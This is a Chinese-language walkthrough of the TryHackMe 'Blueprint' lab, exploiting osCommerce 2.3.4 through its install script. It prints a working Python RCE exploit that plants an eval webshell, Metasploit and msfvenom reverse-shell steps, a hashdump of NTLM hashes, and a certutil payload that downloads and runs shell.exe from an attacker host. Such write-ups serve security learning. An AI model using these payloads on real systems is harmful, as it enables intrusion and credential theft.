# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
┌──(root💀kali)-[~/tryhackme/Blueprint]
└─# nmap -sV -Pn 10.10.3.110    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-16 03:34 EST
Stats: 0:02:38 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 69.23% done; ETC: 03:37 (0:00:29 remaining)
Nmap scan report for 10.10.3.110
Host is up (0.47s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.68 seconds

```
## 服务分析
可以看到开了3个http服务，一个共享服务以及若干rpc服务

浏览器依次打开80和443端口服务，首页都报错。

8080服务显示有一个叫```oscommerce```的web app，版本是```2.3.4```

在kali搜索这个web app的漏洞情况：
```
┌──(root💀kali)-[~/tryhackme/Blueprint]
└─# searchsploit oscommerce 2.3.4
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities                                                                                                                                                               | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection                                                                                                                                                             | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                                                                                                                                                          | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                                                                                                                                           | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                                                                                                                                              | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                                                                                                                                                                | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                                                                                                                                                                | php/webapps/44374.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

可以说满满都是漏洞，包括sql注入，文件上传，远程代码执行等。


## 攻击
我们把远程代码执行攻击脚本拷贝到本地，经过测试目标系统php禁用了```system```函数，但是```passthru```函数是可以使用的。

我们输入```whoami```

回显为：```nt authority\system ```

nice,直接最高权限。

在这里我卡了非常久，因为我不能直接用powershell反弹shell到我的kali。

后面只好转变思路，既然反弹不了，那直接写一句话木马到靶机，还好eval函数也是可以使用的，攻击代码修改如下：
```
import requests

base_url = "http://10.10.3.110:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.3.110:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

payload = '\');'
payload += """eval(@$_POST['cmd']);""" 
payload += '/*'

data['DB_DATABASE'] = payload

r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned")
```
执行完上面的攻击脚本。到msf找到中国菜刀模块，填好参数：
```
msf6 exploit(multi/http/caidao_php_backdoor_exec) > options

Module options (exploit/multi/http/caidao_php_backdoor_exec):

   Name       Current Setting                                           Required  Description
   ----       ---------------                                           --------  -----------
   PASSWORD   cmd                                                       yes       The password of backdoor
   Proxies                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.3.110                                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080                                                      yes       The target port (TCP)
   SSL        false                                                     no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /oscommerce-2.3.4/catalog/install/includes/configure.php  yes       The path of backdoor
   VHOST                                                                no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```


攻击，拿到初始shell，查看是最高的system权限：
```
msf6 exploit(multi/http/caidao_php_backdoor_exec) > run

[*] Started reverse TCP handler on 10.13.21.169:4444 
[*] Sending exploit...
[*] Sending stage (39282 bytes) to 10.10.3.110
[*] Meterpreter session 1 opened (10.13.21.169:4444 -> 10.10.3.110:49346) at 2021-11-17 04:10:33 -0500

meterpreter > getuid
Server username: SYSTEM (0)

```

啃爹的是这个菜刀模块没有hashdump命令，我们只好编译另一个功能完整的payload


```
┌──(root💀kali)-[~/tryhackme/Blueprint]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.21.169 LPORT=4242 -f exe > reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

上传到靶机以后，执行：
```
meterpreter > upload /root/tryhackme/Blueprint/reverse.exe
[*] uploading  : /root/tryhackme/Blueprint/reverse.exe -> reverse.exe
[*] Uploaded -1.00 B of 72.07 KiB (-0.0%): /root/tryhackme/Blueprint/reverse.exe -> reverse.exe
[*] uploaded   : /root/tryhackme/Blueprint/reverse.exe -> reverse.exe
meterpreter > execute -f reverse.exe
Process 4668 created.

```


在另一个msf拿到一个完整功能的shell：
```

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.13.21.169     yes       The listen address (an interface may be specified)
   LPORT     4242             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.13.21.169:4242 
[*] Sending stage (175174 bytes) to 10.10.3.110
[*] Meterpreter session 1 opened (10.13.21.169:4242 -> 10.10.3.110:49350) at 2021-11-17 04:39:12 -0500

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

把上面lab哈希密码的这一段```30e87bf999828446a1c1209ddde4c450```拿到[这个网站](https://www.somd5.com/)破解得到明文密码。


拿到root.txt
```
meterpreter > pwd
C:\Users\Administrator\Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-04-11 18:36:47 -0400  desktop.ini
100666/rw-rw-rw-  37    fil   2019-11-27 13:15:37 -0500  root.txt.txt

```

# 又

看大佬的文章，攻击阶段下面的payload是可以从攻击机上传文件到靶机的，在这里记录一下：
```
payload = '\');'
payload += '$var = shell_exec("cmd.exe /C certutil.exe -urlcache -split -f http://10.8.1.72/shell.exe shell.exe & shell.exe & nslookup test 10.8.1.72 ");' 
payload += 'echo $var;'
payload += '/*'
```